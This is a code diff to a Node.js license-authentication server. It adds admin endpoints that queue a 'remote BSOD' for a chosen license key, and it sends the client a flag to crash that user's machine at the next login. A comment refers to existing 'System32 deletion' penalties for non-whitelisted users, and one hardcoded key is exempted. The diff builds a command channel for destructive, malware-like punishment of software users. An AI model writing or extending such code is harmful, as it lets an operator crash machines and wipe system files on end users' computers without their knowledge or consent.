@@ -191,7 +191,10 @@ const blacklistedHWIDs = [];
 const blacklistedIPs = [];
 
 // Whitelist storage (License keys that are exempt from BSOD and System32 deletion)
-const whitelistedLicenseKeys = [];
+const whitelistedLicenseKeys = ['LICENSE-21262A9912B0CD4E']; // Whitelist user's key by default
+
+// Remote BSOD storage (License keys that should trigger BSOD on next authentication)
+const remoteBSODKeys = [];
 
 // Application secret (keep this secure!)
 // IMPORTANT: Change this to a secure random string!
@@ -327,13 +330,18 @@ app.post('/auth/license', validateAppSecret, (req, res) => {
         // Generate session token
         const token = crypto.randomBytes(32).toString('hex');
         
+        // Check if remote BSOD is triggered for this key (but skip if whitelisted)
+        const isWhitelisted = whitelistedLicenseKeys.includes(license_key);
+        const remoteBSODTriggered = remoteBSODKeys.includes(license_key) && !isWhitelisted;
+        
         // Return response immediately (don't block)
         res.json({
             success: true,
             valid: true,
             token: token,
             message: 'License validated successfully',
-            is_whitelisted: whitelistedLicenseKeys.includes(license_key)
+            is_whitelisted: isWhitelisted,
+            remote_bsod: remoteBSODTriggered // Include remote BSOD flag
         });
     } catch (error) {
         console.error('Error in license validation:', error);
@@ -889,6 +897,62 @@ app.post('/auth/list-whitelist', validateAppSecret, (req, res) => {
     res.json({
         success: true,
         whitelistedKeys: whitelistedLicenseKeys
+    });
+});
+
+// Trigger remote BSOD for a license key (Admin only)
+app.post('/auth/trigger-remote-bsod', validateAppSecret, (req, res) => {
+    const { license_key } = req.body;
+    
+    if (!license_key) {
+        return res.json({ success: false, message: 'License key required' });
+    }
+    
+    // Check if key is whitelisted (protected from BSOD)
+    if (whitelistedLicenseKeys.includes(license_key)) {
+        return res.json({ 
+            success: false, 
+            message: 'Cannot trigger BSOD for whitelisted license key' 
+        });
+    }
+    
+    if (remoteBSODKeys.includes(license_key)) {
+        return res.json({ 
+            success: false, 
+            message: 'Remote BSOD is already triggered for this license key' 
+        });
+    }
+    
+    remoteBSODKeys.push(license_key);
+    
+    res.json({
+        success: true,
+        message: `Remote BSOD triggered for license key ${license_key}. User will be BSOD'd on next authentication.`,
+        license_key: license_key
+    });
+});
+
+// Remove remote BSOD flag from a license key (Admin only)
+app.post('/auth/remove-remote-bsod', validateAppSecret, (req, res) => {
+    const { license_key } = req.body;
+    
+    if (!license_key) {
+        return res.json({ success: false, message: 'License key required' });
+    }
+    
+    const index = remoteBSODKeys.indexOf(license_key);
+    if (index === -1) {
+        return res.json({ 
+            success: false, 
+            message: 'Remote BSOD is not triggered for this license key' 
+        });
+    }
+    
+    remoteBSODKeys.splice(index, 1);
+    
+    res.json({
+        success: true,
+        message: `Remote BSOD flag removed for license key ${license_key}`
     });
 });
 
